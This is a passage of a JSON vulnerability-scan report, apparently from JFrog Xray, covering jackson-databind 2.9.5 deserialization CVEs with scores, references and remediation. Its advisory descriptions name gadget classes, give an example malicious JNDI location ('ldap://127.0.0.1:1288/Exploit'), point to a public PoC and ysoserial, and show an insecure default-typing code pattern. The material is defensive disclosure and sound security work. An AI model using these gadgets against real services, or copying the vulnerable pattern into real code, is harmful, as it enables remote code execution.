            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-138370",
        "references": [
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://security.netapp.com/advisory/ntap-20210205-0005/",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36188",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://github.com/advisories/GHSA-f9xh-2qgp-cq57",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://github.com/FasterXML/jackson-databind/issues/2996",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://github.com/FasterXML/jackson-databind/commit/33d96c13fe18a2dad01b19ce195548c9acea9da4"
        ],
        "extended_information": {
          "short_description": "A typing issue in newrelic in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [newrelic] (https://github.com/newrelic/newrelic-java-agent) gadget, an attacker can set `jndiLocation` to load a malicious Java class from an arbitrary location such as ` ldap://127.0.0.1:1288/Exploit`. This attack was demonstrated publicly in this [PoC]( https://github.com/Al1ex/CVE-2020-36188).\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes newrelic in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes newrelic in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `newrelic` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-36187",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.8 mishandles the interaction between serialization gadgets and typing, related to org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.10.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-138354",
        "references": [
          "https://github.com/advisories/GHSA-r695-7vr9-jgc2",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-36187",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://lists.debian.org/debian-lts-announce/2021/04/msg00025.html",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://github.com/FasterXML/jackson-databind/commit/3e8fa3beea49ea62109df9e643c9cb678dabdde1",
          "https://github.com/FasterXML/jackson-databind/issues/2997",
          "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://security.netapp.com/advisory/ntap-20210205-0005/"
        ],
        "extended_information": {
          "short_description": "A typing issue in Apache Tomcat dbcp in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [Apache Tomcat]( https://github.com/apache/tomcat) dbcp gadget, an attacker can create an arbitrary Pool connection to DB by invoking `testCPDS` in ` org.apache.tomcat.dbcp.dbcp.datasources.SharedPoolDataSource`. The impact of creating such a Pool connection is unknown.\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes dbcp in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `dbcp` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2018-19361",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.8 might allow attackers to have unspecified impact by leveraging failure to block the openjpa class from polymorphic deserialization.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.3]",
              "[2.7.9.5]",
              "[2.8.11.3]",
              "[2.9.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-74870",
        "references": [
          "https://lists.apache.org/thread.html/c70da3cb6e3f03e0ad8013e38b6959419d866c4a7c80fdd34b73f25c%40%3Ccommits.pulsar.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1822",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/42912cac4753f3f718ece875e4d486f8264c2f2b",
          "https://access.redhat.com/errata/RHSA-2019:1823",
          "https://lists.apache.org/thread.html/37e1ed724a1b0e5d191d98c822c426670bdfde83804567131847d2a3@%3Cdevnull.infra.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2804",
          "https://access.redhat.com/errata/RHSA-2019:3140",
          "https://www.debian.org/security/2019/dsa-4452",
          "https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b@%3Ccommits.nifi.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:0782",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://seclists.org/bugtraq/2019/May/68",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b%40%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8@%3Ccommits.pulsar.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3%40%3Ccommits.nifi.apache.org%3E",
          "https://issues.apache.org/jira/browse/TINKERPOP-2121",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://github.com/advisories/GHSA-mx9v-gmh4-mgqw",
          "https://access.redhat.com/errata/RHSA-2019:0877",
          "https://security.netapp.com/advisory/ntap-20190530-0003",
          "https://access.redhat.com/errata/RHBA-2019:0959",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://access.redhat.com/errata/RHSA-2019:1797",
          "https://lists.apache.org/thread.html/ff8dcfe29377088ab655fda9d585dccd5b1f07fabd94ae84fd60a7f8%40%3Ccommits.pulsar.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:4037",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://github.com/FasterXML/jackson/wiki/Jackson-Release-2.9.8",
          "https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "http://www.securityfocus.com/bid/107985",
          "https://nvd.nist.gov/vuln/detail/CVE-2018-19361",
          "https://access.redhat.com/errata/RHSA-2019:3892",
          "https://lists.apache.org/thread.html/c70da3cb6e3f03e0ad8013e38b6959419d866c4a7c80fdd34b73f25c@%3Ccommits.pulsar.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/issues/2186",
          "https://access.redhat.com/errata/RHSA-2019:3002",
          "https://lists.debian.org/debian-lts-announce/2019/03/msg00005.html",
          "https://lists.apache.org/thread.html/37e1ed724a1b0e5d191d98c822c426670bdfde83804567131847d2a3%40%3Cdevnull.infra.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20190530-0003/",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1782"
        ],
        "extended_information": {
          "short_description": "A typing issue in openjpa in Jackson-databind leads to unknown impact.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the blocked gadget is `org.apache.openjpa.ee.RegistryManagedRuntime` and `org.apache.openjpa.ee.JNDIManagedRuntime`\nwhich have an unspecified impact (no technical details about the issue have been published).\n\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `openjpa` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `openjpa` in its Java classpath\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            },
            {
              "name": "The issue's real-world impact is unspecified and nontrivial to deduce",
              "description": "The gadget's real-world impact is unknown, no substantial impact has been publicly demonstrated",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `openjpa` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-14439",
            "cvss_v2_score": "5.0",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:N/A:N",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.x before 2.9.9.2. This occurs when Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the logback jar in the classpath.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.9.9.2]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-85525",
        "references": [
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3%40%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/5fc0e16b7af2590bf1e97c76c136291c4fdb244ee63c65c485c9a7a1@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/940b4c3fef002461b89a050935337056d4a036a65ef68e0bbd4621ef@%3Cdev.struts.apache.org%3E",
          "https://github.com/advisories/GHSA-gwp4-hfv6-p7hw",
          "https://github.com/FasterXML/jackson-databind/issues/2389",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/87e46591de8925f719664a845572d184027258c5a7af0a471b53c77b%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/2d2a76440becb610b9a9cb49b15eac3934b02c2dbcaacde1000353e4@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/940b4c3fef002461b89a050935337056d4a036a65ef68e0bbd4621ef%40%3Cdev.struts.apache.org%3E",
          "https://lists.apache.org/thread.html/0d4b630d9ee724aee50703397d9d1afa2b2befc9395ba7797d0ccea9@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/ee0a051428d2c719acfa297d0854a189ea5e284ef3ed491fa672f4be@%3Cdev.tomee.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:3200",
          "https://github.com/FasterXML/jackson-databind/compare/jackson-databind-2.9.9.1...jackson-databind-2.9.9.2",
          "https://lists.apache.org/thread.html/rca37935d661f4689cb4119f1b3b224413b22be161b678e6e6ce0c69b%40%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/bcce5a9c532b386c68dab2f6b3ce8b0cc9b950ec551766e76391caa3@%3Ccommits.nifi.apache.org%3E",
          "https://lists.apache.org/thread.html/56c8042873595b8c863054c7bfccab4bf2c01c6f5abedae249d914b9@%3Cdev.tomee.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/OVRZDN2T6AZ6DJCZJ3VSIQIVHBVMVWBL/",
          "https://lists.apache.org/thread.html/34717424b4d08b74f65c09a083d6dd1cb0763f37a15d6de135998c1d%40%3Cdev.tomee.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TXRVXNRFHJSQWFHPRJQRI5UPMZ63B544/",
          "https://lists.debian.org/debian-lts-announce/2019/08/msg00011.html",
          "https://lists.apache.org/thread.html/2d2a76440becb610b9a9cb49b15eac3934b02c2dbcaacde1000353e4%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20190814-0001/",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2019-5072832.html",
          "https://lists.apache.org/thread.html/3f99ae8dcdbd69438cb733d745ee3ad5e852068490719a66509b4592@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/56c8042873595b8c863054c7bfccab4bf2c01c6f5abedae249d914b9%40%3Cdev.tomee.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://github.com/FasterXML/jackson-databind/commit/ad418eeb974e357f2797aef64aa0e3ffaaa6125b",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/OVRZDN2T6AZ6DJCZJ3VSIQIVHBVMVWBL/",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TXRVXNRFHJSQWFHPRJQRI5UPMZ63B544/",
          "https://lists.apache.org/thread.html/5fc0e16b7af2590bf1e97c76c136291c4fdb244ee63c65c485c9a7a1%40%3Cdev.tomee.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-14439",
          "https://lists.apache.org/thread.html/5ecc333113b139429f4f05000d4aa2886974d4df3269c1dd990bb319%40%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/5ecc333113b139429f4f05000d4aa2886974d4df3269c1dd990bb319@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/3f99ae8dcdbd69438cb733d745ee3ad5e852068490719a66509b4592%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/0d4b630d9ee724aee50703397d9d1afa2b2befc9395ba7797d0ccea9%40%3Cdev.tomee.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://lists.apache.org/thread.html/34717424b4d08b74f65c09a083d6dd1cb0763f37a15d6de135998c1d@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/87e46591de8925f719664a845572d184027258c5a7af0a471b53c77b@%3Cdev.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/ee0a051428d2c719acfa297d0854a189ea5e284ef3ed491fa672f4be%40%3Cdev.tomee.apache.org%3E",
          "https://www.debian.org/security/2019/dsa-4542",
          "https://seclists.org/bugtraq/2019/Oct/6"
        ],
        "extended_information": {
          "short_description": "A typing issue in logback gadget in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the 